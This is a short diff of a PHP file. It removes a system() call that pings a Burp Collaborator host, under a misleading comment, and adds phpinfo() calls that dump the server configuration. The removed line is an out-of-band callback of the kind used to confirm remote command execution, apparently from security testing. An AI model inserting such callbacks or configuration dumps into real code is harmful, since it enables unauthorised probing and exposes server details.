@@ -1,4 +1,10 @@
 <?php
-// Return the user the script is running under
-system("ping -c4 http://ie0z621qwxdk5z3wo02cv27zsqygm5.burpcollaborator.net");
+
+// Show all information, defaults to INFO_ALL
+phpinfo();
+
+// Show just the module information.
+// phpinfo(8) yields identical results.
+phpinfo(INFO_MODULES);
+
 ?>
